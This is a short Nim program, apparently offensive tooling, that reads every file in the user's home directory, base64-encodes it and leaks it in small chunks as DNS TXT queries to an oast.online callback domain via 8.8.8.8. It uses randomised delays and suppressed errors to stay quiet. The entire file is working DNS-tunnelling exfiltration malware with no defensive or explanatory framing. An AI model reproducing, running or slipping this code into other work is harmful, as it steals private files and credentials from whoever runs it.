import dnsclient, os, random
from base64 import encode

const chunksize = 20
#echo chunksize

proc nsex(ns: string, target: string, domain_name: string): void = 
 var content = readFile(target)
 let b64 = encode(content,safe=true)
 var stringindex = 0
 while stringindex <= b64.len - 1:
  try:
   var query = b64[stringindex .. (if stringindex + chunksize - 1 > b64.len - 1: b64.len - 1 else: stringindex + chunksize - 1)]
   let client = newDNSClient(ns)
   var dnsquery = query & "." & domain_name
   var response = client.sendQuery(dnsquery,TXT)
#   echo response
   stringindex += chunksize
   sleep(rand(2000..30000))
  except Exception as e:
    discard
#   echo "Caught Exception: ", e.msg   

when isMainModule:
 for kind, path  in walkDir(getHomeDir()):
#  echo path
  try:
   nsex("8.8.8.8", path, "d0bppvukuj25s86t4750nn63j5i3a19as.oast.online")
  except:
   discard
